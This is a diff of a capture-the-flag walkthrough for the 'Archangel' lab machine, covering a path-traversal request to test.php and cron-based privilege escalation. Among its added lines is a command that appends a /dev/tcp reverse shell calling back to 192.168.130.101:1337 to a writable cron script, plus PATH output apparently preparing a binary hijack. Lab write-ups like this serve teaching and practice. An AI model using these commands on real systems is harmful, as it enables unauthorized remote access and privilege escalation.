@@ -74,8 +74,7 @@ GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/
 
 ## Privilege Escalation
 
-
-Crontab indicates this `/opt/helloworld.sh` runs with Archangel;s privilege in 1 minute
+On `/etc/crontab` indicates this `/opt/helloworld.sh` runs with Archangel's privilege in 1 minute
 
 ```
 $ cat /etc/crontab 
@@ -96,7 +95,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 ```
 
-We can take a look
+We can take a look at this file:
 
 ```
 www-data@ubuntu:/opt$ cat helloworld.sh 
@@ -107,7 +106,11 @@ www-data@ubuntu:/opt$ bash helloworld.sh
 helloworld.sh: line 2: /opt/backupfiles/helloworld.txt: Permission denied
 ```
 
-On the local machine, Let's create a reverse shell script
+
+
+```
+www-data@ubuntu:/opt$ echo "sh -i >& /dev/tcp/192.168.130.101/1337 0>&1" >> helloworld.sh
+```
 
 
 
@@ -150,6 +153,16 @@ The file backup is owned by the root and can be executed.
 We can see `cp /home/user/archangel/myfiles/* /opt/backupfiles`
 
 
+
+```
+archangel@ubuntu:/tmp$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+```
+archangel@ubuntu:~/secret$ echo $PATH
+/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
 
 
 ```
